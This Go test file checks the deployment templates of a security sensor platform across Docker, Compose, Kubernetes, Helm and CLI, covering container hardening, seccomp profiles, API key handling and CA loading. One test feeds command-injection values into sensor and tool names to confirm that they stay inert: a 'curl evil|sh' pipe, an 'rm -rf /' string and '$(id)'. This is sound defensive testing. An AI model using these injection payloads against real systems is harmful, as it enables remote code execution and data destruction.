package sensor

import (
	"bytes"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"math/big"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"gopkg.in/yaml.v3"

	sensordom "github.com/openctemio/openctem/api/pkg/domain/sensor"
	"github.com/openctemio/openctem/api/pkg/domain/shared"
	"github.com/openctemio/openctem/api/pkg/logger"
)

// shippedTemplatesDir is the directory the API image ships the templates in.
const shippedTemplatesDir = "../../../configs/sensor-products"

// templateSources renders from the shipped files and from the built-in
// fallbacks; both must produce working snippets.
var templateSources = []string{shippedTemplatesDir, "/nonexistent-uses-builtins"}

func testCAPEM(t *testing.T) []byte {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	tmpl := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: "Caddy Local Authority - 2026 ECC Root"},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().Add(time.Hour),
		IsCA:                  true,
		BasicConstraintsValid: true,
		KeyUsage:              x509.KeyUsageCertSign,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		t.Fatal(err)
	}
	return pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
}

func daemonSensor(tools ...string) *sensordom.Sensor {
	tenantID := shared.NewID()
	return &sensordom.Sensor{
		ID: shared.NewID(), TenantID: &tenantID, Name: "DMZ Scanner 01",
		Type: sensordom.SensorTypeWorker, ExecutionMode: sensordom.ExecutionModeDaemon, Reported: sensordom.ReportOf(tools...),
	}
}

func render(t *testing.T, dir string, data SensorTemplateData) *RenderedTemplates {
	t.Helper()
	out, err := NewSensorConfigTemplateService(dir, logger.NewNop()).Render(data)
	if err != nil {
		t.Fatalf("[%s] render: %v", dir, err)
	}
	return out
}

func fullData(t *testing.T) SensorTemplateData {
	return SensorTemplateData{
		Sensor:  daemonSensor("nuclei", "trivy"),
		APIKey:  "rda_4b1e0123456789abcdef",
		BaseURL: "https://192.0.2.204",
		Image:   "ghcr.io/openctemio/sensor:v0.4.2",
		CACert:  string(testCAPEM(t)),
	}
}

// bashSyntaxOK runs `bash -n` on a snippet: it must parse as pasted.
func bashSyntaxOK(t *testing.T, label, script string) {
	t.Helper()
	if _, err := exec.LookPath("bash"); err != nil {
		t.Skip("bash not available")
	}
	cmd := exec.Command("bash", "-n")
	cmd.Stdin = strings.NewReader(script)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		t.Errorf("%s does not parse as shell: %v %s\n%s", label, err, stderr.String(), script)
	}
}

// continuationLinesOK: a line ending in a backslash continues the command, so
// the next line must not be a comment or blank (that ends the command early,
// the bug in the old docker template).
func continuationLinesOK(t *testing.T, label, script string) {
	t.Helper()
	lines := strings.Split(script, "\n")
	for i, l := range lines {
		if !strings.HasSuffix(strings.TrimRight(l, " "), `\`) || i+1 >= len(lines) {
			continue
		}
		next := strings.TrimSpace(lines[i+1])
		if next == "" || strings.HasPrefix(next, "#") {
			t.Errorf("%s: line %d continues into %q:\n%s", label, i+1, next, script)
		}
	}
}

func TestTemplates_DockerRunWorksAsPasted(t *testing.T) {
	for _, dir := range templateSources {
		d := render(t, dir, fullData(t)).Docker
		bashSyntaxOK(t, dir+" docker", d)
		continuationLinesOK(t, dir+" docker", d)
		for _, want := range []string{
			"ghcr.io/openctemio/sensor:v0.4.2",
			"-e SENSOR_API_URL='https://192.0.2.204'",
			"-e SENSOR_API_KEY='rda_4b1e0123456789abcdef'",
			"-e SSL_CERT_DIR=/etc/openctem/certs",
			// The CA and the sensor-local policy both live under /etc/openctem,
			// mounted read-only; the policy is required (fail closed).
			"-v /etc/openctem:/etc/openctem:ro",
			"sudo install -m 0644 sensor-policy.yaml /etc/openctem/sensor-policy.yaml",
			"-e SENSOR_LOCAL_POLICY=/etc/openctem/sensor-policy.yaml",
			// Hardened by default (RFC-040 §5.10).
			"--read-only --cap-drop ALL --security-opt no-new-privileges:true",
			"--tmpfs /tmp",
			"-e XDG_CONFIG_HOME=/tmp/.config -e XDG_CACHE_HOME=/tmp/.cache",
			// One data volume: state/, outbox/, content/.
			"-v dmz-scanner-01-data:/var/lib/openctem \\",
			"--restart unless-stopped",
			"--name dmz-scanner-01",
			"-----BEGIN CERTIFICATE-----",
			"chmod 0644",
		} {
			if !strings.Contains(d, want) {
				t.Errorf("[%s] docker snippet lacks %q:\n%s", dir, want, d)
			}
		}
		// The image's home directory holds the baked nuclei-templates
		// release: nothing is mounted over it.
		for _, bad := range []string{"openctemio/agent", ":latest", "AGENT_", "-config", "/path/to/scan", "/home/openctem"} {
			if strings.Contains(d, bad) {
				t.Errorf("[%s] docker snippet still has %q:\n%s", dir, bad, d)
			}
		}
	}
}

func TestTemplates_NoKeyNoCA(t *testing.T) {
	for _, dir := range templateSources {
		data := fullData(t)
		data.APIKey, data.CACert = "", ""
		out := render(t, dir, data)
		bashSyntaxOK(t, dir+" docker", out.Docker)
		// Without the key the snippet reads it from the environment and stops
		// with a clear message when it is not set; no "<YOUR_API_KEY>", which
		// the shell would read as a redirection.
		if !strings.Contains(out.Docker, `-e SENSOR_API_KEY="${OPENCTEM_API_KEY:?`) {
			t.Errorf("[%s] docker without a key:\n%s", dir, out.Docker)
		}
		if strings.Contains(out.Docker, "<YOUR_API_KEY>") || strings.Contains(out.Docker, "SSL_CERT_DIR") ||
			strings.Contains(out.Docker, "BEGIN CERTIFICATE") {
			t.Errorf("[%s] docker without key/CA:\n%s", dir, out.Docker)
		}
		if strings.Contains(out.Compose, "openctem_ca") || strings.Contains(out.Kubernetes, "ca.crt") {
			t.Errorf("[%s] CA steps without a CA:\ncompose:\n%s\nkubernetes:\n%s", dir, out.Compose, out.Kubernetes)
		}
	}
}

func TestTemplates_OneShotRunner(t *testing.T) {
	for _, dir := range templateSources {
		data := fullData(t)
		data.Sensor.Type, data.Sensor.ExecutionMode = sensordom.SensorTypeWorker, sensordom.ExecutionModeStandalone
		data.Sensor.Reported = sensordom.ReportOf("semgrep")
		d := render(t, dir, data).Docker
		bashSyntaxOK(t, dir+" runner docker", d)
		continuationLinesOK(t, dir+" runner docker", d)
		for _, want := range []string{"docker run --rm", `-v "$PWD":/scan`, "-tool semgrep -target /scan -push"} {
			if !strings.Contains(d, want) {
				t.Errorf("[%s] runner snippet lacks %q:\n%s", dir, want, d)
			}
		}
		if strings.Contains(d, "--restart") {
			t.Errorf("[%s] a one-shot run must not restart:\n%s", dir, d)
		}
	}
}

func TestTemplates_ComposeIsValid(t *testing.T) {
	for _, dir := range templateSources {
		c := render(t, dir, fullData(t)).Compose
		var doc struct {
			Services map[string]struct {
				Image       string            `yaml:"image"`
				Restart     string            `yaml:"restart"`
				Environment map[string]string `yaml:"environment"`
				Volumes     []string          `yaml:"volumes"`
				ReadOnly    bool              `yaml:"read_only"`
				CapDrop     []string          `yaml:"cap_drop"`
				SecurityOpt []string          `yaml:"security_opt"`
				Tmpfs       []string          `yaml:"tmpfs"`
				Configs     []struct {
					Source string `yaml:"source"`
					Target string `yaml:"target"`
				} `yaml:"configs"`
			} `yaml:"services"`
			Volumes map[string]any `yaml:"volumes"`
			Configs map[string]struct {
				Content string `yaml:"content"`
			} `yaml:"configs"`
		}
		if err := yaml.Unmarshal([]byte(c), &doc); err != nil {
			t.Fatalf("[%s] compose is not YAML: %v\n%s", dir, err, c)
		}
		s, ok := doc.Services["sensor"]
		if !ok {
			t.Fatalf("[%s] compose has no sensor service:\n%s", dir, c)
		}
		if s.Image != "ghcr.io/openctemio/sensor:v0.4.2" || s.Restart != "unless-stopped" {
			t.Errorf("[%s] image=%q restart=%q", dir, s.Image, s.Restart)
		}
		if s.Environment["SENSOR_API_URL"] != "https://192.0.2.204" ||
			s.Environment["SSL_CERT_DIR"] != "/etc/openctem/certs" {
			t.Errorf("[%s] environment = %v", dir, s.Environment)
		}
		// The key comes from .env, never written into the compose file.
		if !strings.HasPrefix(s.Environment["SENSOR_API_KEY"], "${OPENCTEM_API_KEY:?") || strings.Contains(c, "SENSOR_API_KEY: rda_") {
			t.Errorf("[%s] SENSOR_API_KEY = %q", dir, s.Environment["SENSOR_API_KEY"])
		}
		if !strings.Contains(c, "OPENCTEM_API_KEY=rda_4b1e0123456789abcdef") {
			t.Errorf("[%s] compose does not say how to write .env with the key:\n%s", dir, c)
		}
		if len(s.Volumes) != 2 || s.Volumes[0] != "data:/var/lib/openctem" ||
			s.Volumes[1] != "./policy:/etc/openctem/policy:ro" {
			t.Errorf("[%s] volumes = %v, want the data volume and the read-only policy", dir, s.Volumes)
		}
		// Hardened, with the sensor-local policy required (RFC-040).
		if !s.ReadOnly || len(s.CapDrop) != 1 || s.CapDrop[0] != "ALL" || len(s.SecurityOpt) != 2 ||
			s.SecurityOpt[0] != "no-new-privileges:true" || s.SecurityOpt[1] != "seccomp=./sensor-seccomp.json" || len(s.Tmpfs) != 1 || s.Tmpfs[0] != "/tmp" ||
			s.Environment["XDG_CONFIG_HOME"] != "/tmp/.config" || s.Environment["XDG_CACHE_HOME"] != "/tmp/.cache" ||
			s.Environment["SENSOR_LOCAL_POLICY"] != "/etc/openctem/policy/sensor-policy.yaml" ||
			s.Environment["SENSOR_KILL_SWITCH_FILE"] != "/etc/openctem/policy/STOP" {
			t.Errorf("[%s] hardening/policy: read_only=%v cap_drop=%v security_opt=%v tmpfs=%v env=%v", dir,
				s.ReadOnly, s.CapDrop, s.SecurityOpt, s.Tmpfs, s.Environment)
		}
		if _, ok := doc.Volumes["data"]; !ok || len(doc.Volumes) != 1 {
			t.Errorf("[%s] compose must declare exactly the data volume (%v):\n%s", dir, doc.Volumes, c)
		}
		if len(s.Configs) != 1 || s.Configs[0].Target != "/etc/openctem/certs/openctem-root-ca.crt" ||
			!strings.Contains(doc.Configs[s.Configs[0].Source].Content, "BEGIN CERTIFICATE") {
			t.Errorf("[%s] CA config = %+v", dir, s.Configs)
		}
	}
}

func TestTemplates_KubernetesManifestsAreValid(t *testing.T) {
	for _, dir := range templateSources {
		k := render(t, dir, fullData(t)).Kubernetes
		dec := yaml.NewDecoder(strings.NewReader(k))
		kinds := map[string]map[string]any{}
		for {
			var obj map[string]any
			err := dec.Decode(&obj)
			if errors.Is(err, io.EOF) {
				break
			}
			if err != nil {
				t.Fatalf("[%s] manifest is not YAML: %v\n%s", dir, err, k)
			}
			if obj == nil {
				continue
			}
			kinds[obj["kind"].(string)] = obj
		}
		for _, kind := range []string{"Secret", "PersistentVolumeClaim", "Deployment"} {
			if _, ok := kinds[kind]; !ok {
				t.Errorf("[%s] no %s in:\n%s", dir, kind, k)
			}
		}
		for _, want := range []string{
			"image: ghcr.io/openctemio/sensor:v0.4.2", "api-key: rda_4b1e0123456789abcdef",
			"SSL_CERT_DIR", "mountPath: /var/lib/openctem\n", "type: Recreate", "BEGIN CERTIFICATE",
			"claimName: dmz-scanner-01-data", "name: dmz-scanner-01-data", "storage: 8Gi",
			// The identity key stays 0600 across pod replacements.
			"fsGroupChangePolicy: OnRootMismatch",
			"value: /tmp/.config", "mountPath: /tmp",
		} {
			if !strings.Contains(k, want) {
				t.Errorf("[%s] manifest lacks %q", dir, want)
			}
		}
		// One data volume, never a volume per subdirectory (it would shadow
		// that subdirectory of the data volume).
		if strings.Contains(k, "mountPath: /var/lib/openctem/") {
			t.Errorf("[%s] manifest mounts a subdirectory of the data volume:\n%s", dir, k)
		}
		// The baked nuclei-templates release lives in the image's home.
		if strings.Contains(k, "mountPath: /home/openctem") {
			t.Errorf("[%s] manifest mounts over the image's home directory:\n%s", dir, k)
		}
	}
}

func TestTemplates_HelmUsesTheChartsSensorValues(t *testing.T) {
	for _, dir := range templateSources {
		h := render(t, dir, fullData(t)).Helm
		bashSyntaxOK(t, dir+" helm", h)
		continuationLinesOK(t, dir+" helm", h)
		for _, want := range []string{
			"--set sensor.enabled=true", "--set sensor.image.tag=v0.4.2", "--set sensor.existingSecret=",
			"--set sensor.data.persistence.enabled=true",
			"--from-literal=api-key='rda_4b1e0123456789abcdef'",
		} {
			if !strings.Contains(h, want) {
				t.Errorf("[%s] helm lacks %q:\n%s", dir, want, h)
			}
		}
	}
}

func TestTemplates_YAMLEnvCLIUseTheCurrentSensorSettings(t *testing.T) {
	for _, dir := range templateSources {
		out := render(t, dir, fullData(t))
		var cfg struct {
			Sensor map[string]any `yaml:"sensor"`
			Server struct {
				BaseURL  string `yaml:"base_url"`
				APIKey   string `yaml:"api_key"`
				SensorID string `yaml:"sensor_id"`
			} `yaml:"server"`
			Outbox map[string]any `yaml:"outbox"`
		}
		if err := yaml.Unmarshal([]byte(out.YAML), &cfg); err != nil {
			t.Fatalf("[%s] yaml: %v\n%s", dir, err, out.YAML)
		}
		if cfg.Sensor["name"] != "DMZ Scanner 01" || cfg.Server.BaseURL != "https://192.0.2.204" ||
			cfg.Server.APIKey != "rda_4b1e0123456789abcdef" || cfg.Server.SensorID == "" || cfg.Outbox["dir"] == nil {
			t.Errorf("[%s] yaml = %+v\n%s", dir, cfg, out.YAML)
		}
		bashSyntaxOK(t, dir+" env", out.Env)
		bashSyntaxOK(t, dir+" cli", out.CLI)
		for label, s := range map[string]string{"yaml": out.YAML, "env": out.Env, "cli": out.CLI} {
			for _, bad := range []string{"AGENT_ID", "agent_id", "./agent ", "\nagent:"} {
				if strings.Contains(s, bad) {
					t.Errorf("[%s] %s still has %q", dir, label, bad)
				}
			}
		}
		if !strings.Contains(out.Env, "export SSL_CERT_DIR=") || !strings.Contains(out.CLI, "openctemio-sensor") {
			t.Errorf("[%s] env/cli:\n%s\n%s", dir, out.Env, out.CLI)
		}
	}
}

func TestTemplates_SensorInstallsListNoTools(t *testing.T) {
	// The sensor offers the tools it finds (its image defines the set) and
	// the local policy's tools.allow narrows them. A snippet that re-emits
	// the tools the sensor last reported pins a reinstalled sensor to its
	// old set, so no install snippet may carry a tool list. The one-shot
	// run (-tool <name>) is a different mode and keeps its single tool.
	for _, dir := range templateSources {
		out := render(t, dir, fullData(t))
		for label, s := range map[string]string{
			"yaml": out.YAML, "env": out.Env, "docker": out.Docker, "cli": out.CLI,
			"compose": out.Compose, "kubernetes": out.Kubernetes, "helm": out.Helm,
		} {
			for _, bad := range []string{"SENSOR_TOOLS", "-tools", "sensor.tools", "\nscanners:"} {
				if strings.Contains(s, bad) {
					t.Errorf("[%s] %s emits %q:\n%s", dir, label, bad, s)
				}
			}
		}
		// Sensor v0.21.0+ runs the daemon with platform commands by default;
		// the deprecated -daemon / -enable-commands flags are not emitted.
		if !strings.Contains(out.CLI, "\n./openctemio-sensor\n") {
			t.Errorf("[%s] cli daemon command changed:\n%s", dir, out.CLI)
		}
		for _, deprecated := range []string{"-daemon", "-enable-commands"} {
			if strings.Contains(out.CLI, deprecated) {
				t.Errorf("[%s] cli emits deprecated %s:\n%s", dir, deprecated, out.CLI)
			}
		}
	}
}

// Values that end up in a shell snippet are not trusted blindly: tool names are
// set by tenant admins, the name is slugified, and quoting covers the rest.
func TestTemplates_HostileValuesStayInert(t *testing.T) {
	for _, dir := range templateSources {
		data := fullData(t)
		data.Sensor.Name = `x"; rm -rf / #`
		data.Sensor.Reported = sensordom.ReportOf("nuclei;curl evil|sh", "$(id)", "trivy")
		out := render(t, dir, data)
		bashSyntaxOK(t, dir+" docker", out.Docker)
		for label, s := range map[string]string{"docker": out.Docker, "helm": out.Helm, "env": out.Env, "cli": out.CLI} {
			for _, bad := range []string{"curl evil", "$(id)", "rm -rf"} {
				if strings.Contains(s, bad) {
					t.Errorf("[%s] %s carries %q:\n%s", dir, label, bad, s)
				}
			}
		}
		if !strings.Contains(out.Policy, `- "trivy"`) {
			t.Errorf("[%s] the valid tool was dropped from the policy:\n%s", dir, out.Policy)
		}
	}
}

// The files shipped in configs/sensor-products and the built-in fallbacks are
// the same templates; an edit to one must be made to the other.
func TestTemplates_ShippedFilesMatchBuiltins(t *testing.T) {
	for _, f := range templateNames() {
		b, err := os.ReadFile(filepath.Join(shippedTemplatesDir, f+".tmpl"))
		if err != nil {
			t.Fatalf("read %s: %v", f, err)
		}
		if string(b) != builtinTemplates[f] {
			t.Errorf("configs/sensor-products/%s.tmpl differs from the built-in %q template", f, f)
		}
	}
}

func TestLoadCACertificate(t *testing.T) {
	dir := t.TempDir()
	ca := testCAPEM(t)

	write := func(name string, b []byte) string {
		p := filepath.Join(dir, name)
		if err := os.WriteFile(p, b, 0o600); err != nil {
			t.Fatal(err)
		}
		return p
	}

	pemOut, fp, err := LoadCACertificate(write("ca.crt", ca))
	if err != nil || pemOut != string(ca) {
		t.Fatalf("valid CA: err=%v pem=%q", err, pemOut)
	}
	if len(fp) != 95 || strings.Count(fp, ":") != 31 {
		t.Errorf("fingerprint %q is not colon-separated SHA-256", fp)
	}

	// A file that also holds a private key: only the certificate comes out.
	keyBlock := pem.EncodeToMemory(&pem.Block{Type: "PRIVATE KEY", Bytes: []byte("secret-key-material")})
	pemOut, _, err = LoadCACertificate(write("mixed.pem", append(append([]byte{}, keyBlock...), ca...)))
	if err != nil || strings.Contains(pemOut, "PRIVATE KEY") || !strings.Contains(pemOut, "BEGIN CERTIFICATE") {
		t.Errorf("mixed file: err=%v pem=%q", err, pemOut)
	}

	for name, b := range map[string][]byte{
		"garbage.crt":  []byte("not a certificate"),
		"key-only.pem": keyBlock,
		"bad-der.crt":  pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: []byte("junk")}),
	} {
		if pemOut, _, err := LoadCACertificate(write(name, b)); err == nil || pemOut != "" {
			t.Errorf("%s: want an error and no PEM, got %q", name, pemOut)
		}
	}
	if _, _, err := LoadCACertificate(filepath.Join(dir, "missing.crt")); err == nil {
		t.Error("missing file: want an error")
	}
	if pemOut, fp, err := LoadCACertificate(""); err != nil || pemOut != "" || fp != "" {
		t.Errorf("unset path: want nothing, got %q %q %v", pemOut, fp, err)
	}
}

// SECURITY: every daemon install runs the sensor under its own seccomp
// profile, downloaded from the platform and checked by its SHA-256 before
// the container starts, so tool tasks can run network-confined.
func TestTemplates_SeccompProfileInEveryInstall(t *testing.T) {
	for _, dir := range templateSources {
		out := render(t, dir, fullData(t))
		url := "https://192.0.2.204" + SeccompProfilePath
		check := "echo '" + SeccompProfileSHA256 + "  "
		for name, want := range map[string][]string{
			"docker": {"--security-opt seccomp=/etc/openctem/sensor-seccomp.json",
				"--cacert /etc/openctem/certs/openctem-root-ca.crt -o /etc/openctem/sensor-seccomp.json '" + url + "'",
				check + "/etc/openctem/sensor-seccomp.json' | sha256sum -c -"},
			"compose":    {"seccomp=./sensor-seccomp.json", url, check + "sensor-seccomp.json' | sha256sum -c -"},
			"kubernetes": {"type: Localhost", "localhostProfile: openctem/sensor-seccomp.json", url, check},
			"helm":       {"--set sensor.sandbox.seccompProfile=openctem"},
		} {
			got := map[string]string{"docker": out.Docker, "compose": out.Compose, "kubernetes": out.Kubernetes, "helm": out.Helm}[name]
			for _, w := range want {
				if !strings.Contains(got, w) {
					t.Errorf("[%s] %s snippet lacks %q", dir, name, w)
				}
			}
		}
		// The download runs before the container starts.
		if strings.Index(out.Docker, "sha256sum -c -") > strings.Index(out.Docker, "docker run -d") {
			t.Errorf("[%s] docker: the profile is checked after the container starts", dir)
		}
	}
	// A base URL with a trailing slash still gives one slash.
	data := fullData(t)
	data.BaseURL = "https://192.0.2.204/"
	if d := render(t, templateSources[0], data).Docker; strings.Contains(d, "204//api") {
		t.Fatal("double slash in the profile URL")
	}
}

// A collector sensor's install commands run the asset collector image with
// its own settings, never the scanner image, its local policy or its
// seccomp profile; secrets come from files.
func TestTemplates_CollectorRunsTheAssetCollector(t *testing.T) {
	for _, dir := range templateSources {
		data := fullData(t)
		data.Sensor.Type = sensordom.SensorTypeCollector
		data.Image = "ghcr.io/openctemio/asset-collector:v0.2.0"
		out := render(t, dir, data)
		bashSyntaxOK(t, dir+" collector docker", out.Docker)
		continuationLinesOK(t, dir+" collector docker", out.Docker)
		bashSyntaxOK(t, dir+" collector env", out.Env)
		for name, got := range map[string]string{"docker": out.Docker, "compose": out.Compose, "kubernetes": out.Kubernetes} {
			for _, want := range []string{"ghcr.io/openctemio/asset-collector:v0.2.0", "SENSOR_API_KEY_FILE", "LDAP_PASSWORD_FILE", "/var/lib/openctem"} {
				if !strings.Contains(got, want) {
					t.Errorf("[%s] collector %s lacks %q", dir, name, want)
				}
			}
			for _, never := range []string{"ghcr.io/openctemio/sensor", "sensor-policy.yaml", "seccomp=", "SENSOR_LOCAL_POLICY"} {
				if strings.Contains(got, never) {
					t.Errorf("[%s] collector %s carries %q", dir, name, never)
				}
			}
		}
		// The key is written to a secret file, never into the env file or the
		// compose file's environment.
		if !strings.Contains(out.Docker, "> secrets/sensor-api-key") || strings.Contains(out.Docker, "SENSOR_API_KEY=") {
			t.Errorf("[%s] collector docker: the key is not kept in a file:\n%s", dir, out.Docker)
		}
		var doc struct {
			Services map[string]struct {
				Image       string            `yaml:"image"`
				ReadOnly    bool              `yaml:"read_only"`
				Environment map[string]string `yaml:"environment"`
				Secrets     []string          `yaml:"secrets"`
			} `yaml:"services"`
		}
		if err := yaml.Unmarshal([]byte(out.Compose), &doc); err != nil {
			t.Fatalf("[%s] collector compose does not parse: %v", dir, err)
		}
		c := doc.Services["collector"]
		if c.Image != data.Image || !c.ReadOnly || c.Environment["SENSOR_API_KEY_FILE"] != "/run/secrets/sensor_api_key" || len(c.Secrets) != 2 {
			t.Errorf("[%s] collector compose service %+v", dir, c)
		}
		dec := yaml.NewDecoder(strings.NewReader(out.Kubernetes))
		kinds := []string{}
		for {
			var m map[string]any
			if err := dec.Decode(&m); err != nil {
				break
			}
			kinds = append(kinds, fmt.Sprint(m["kind"]))
		}
		if !slices.Equal(kinds, []string{"Secret", "PersistentVolumeClaim", "Deployment"}) {
			t.Errorf("[%s] collector kubernetes kinds %v", dir, kinds)
		}
		if !strings.Contains(out.Helm, "scanner sensor only") {
			t.Errorf("[%s] collector helm: %s", dir, out.Helm)
		}
		// The scanner's templates are unchanged for a scanner.
		if s := render(t, dir, fullData(t)); strings.Contains(s.Docker, "asset-collector") {
			t.Errorf("[%s] a scanner renders the collector", dir)
		}
	}
}
